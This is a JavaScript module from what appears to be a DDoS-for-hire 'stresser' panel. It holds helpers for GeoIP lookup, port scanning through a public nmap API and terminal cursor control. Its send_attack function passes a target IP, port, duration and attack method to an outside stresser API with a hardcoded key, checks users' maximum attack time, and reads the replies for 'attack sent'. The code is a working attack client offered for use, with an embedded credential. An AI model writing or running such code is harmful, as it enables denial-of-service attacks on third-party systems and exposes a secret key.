// Modules
const fs = require("fs");
const fetch = require("node-fetch");

// Files
const Crud = require("../Auth/crud.js");
const Config = require("../Config/main.js");

/*
*@params: Milliseconds
*@type: 
*/
exports.sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

exports.GeoIP = async function(ip) {
    let geoResult = JSON.parse(await(await fetch(`http://ip-api.com/json/${ip}`)).text());
    let result = "";
    return new Promise(resolve => {
        Object.keys(geoResult).forEach(key => {
            result += ("                    " + Config.Colors.Red + (key[0].toUpperCase() + key.slice(1)) + Config.Colors.Yellow + ": " + geoResult[key] + "\r\n");
        })
        resolve(result);
    })
}

exports.pScan = async function(ip) {
    let getPorts = await(await fetch(`https://api.hackertarget.com/nmap/?q=${ip}`)).text();
    let results = "";
    getPorts.split("\n").forEach(e => {
        if(e.includes("open")) {
            results += "                    " + ((((e.split(" ").join(",")).split(",,,").join(" ")).split(",,").join(",")).split(",").join(" ").split(" ") + "\r\n");
        } else if(e.includes("closed")) {
            results += "                    " + ((((e.split(" ").join(",")).split(",,,").join(" ")).split(",,").join(",")).split(",").join(" ").split(" ") + "\r\n");
        } else if(e.includes("filter")) {
            results += "                    " + ((((e.split(" ").join(",")).split(",,,").join(" ")).split(",,").join(",")).split(",").join(" ").split(" ") + "\r\n");
        }
    })
    return this.ColorPortScan(results)
}

exports.ColorPortScan = function(r) {    
    lines = r.split("\n");
    let results = "";
    lines.forEach(e => {
        if(e.length < 4) return;
        let shit = e.split(",");
        results += Config.Colors.Red + shit[0] + " " + Config.Colors.Yellow + shit[1] + " " + Config.Colors.Red + shit[2] + "\n";
    })
    return results;
}

/*
*
*       Terminal Control
*
*/

exports.set_cursor = function(row, column, socket) {
    socket.write("\033[" + row + ";" + column + "f");
}

exports.MoveCursorToLeft = function(count, socket) {
    socket.write("\033[" + count + "D")
}

exports.MoveCursorUp = function(count, socket) {
    socket.write("\033[" + count + "A");
}

exports.MoveCursorDown = function(count, socket) { 
    socket.write("\033[" + count + "B");
}

/*
*
*           STRESSER 
*
*/

exports.methodValidation = async function(meth) { 
    let methods = await(await fetch("https://syntaxapi.xyz/methods.txt")).text();
    return (methods.includes(meth) ? true : false);
}

exports.send_attack = async function(ip, port, time, method, usr) {
    console.log("lol")
    let get_user = await Crud.GetUser(usr, "arr");
    console.log(get_user)
    if(parseInt(time) > parseInt(get_user[3])) return "[x] Error, You've reached your max time!\r\n";
    // if(await this.methodValidation(method) == false) return "[x] Error, Invalid method!\r\n";

    // this.log_action(usr, ip, port, time, method);
    let response = "";
    
    console.log("lol")
    let rreturn = await(await fetch("https://lunarapi.xyz/stresser/api/api.php?key=4C1wJ4oh82gHjHnu&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn);
    response += "                    API 1: " + await this.get_api_response(rreturn) + "\r\n";
    return response;
}

exports.get_api_response = function(rpn) {
    let new_res = rpn.toLowerCase();
    if(new_res.includes("attack sent") || new_res.includes("udphex") || new_res.includes("std") || new_res.includes("rawtcp") || new_res.includes("attack initalized") || new_res.includes('"status":"success"') || new_res.includes("attack started") || new_res.includes("powered by overowered")) {
        return "Attack Sent";
    } else if(new_res.includes("invalid key") || new_res.includes("key is invalid")) {
        return "Error, Invalid Key";
    } else if(new_res.includes("invalid method") || new_res.includes("method is invalid") || new_res.includes("method does not exist") || new_res.includes("method doesn't exist")) {
        return "Error, Invalid Method";
    } else {
        return "Error, Something went wrong catching attack response but this doesn't mean the attack didn't go through!";
    }
}
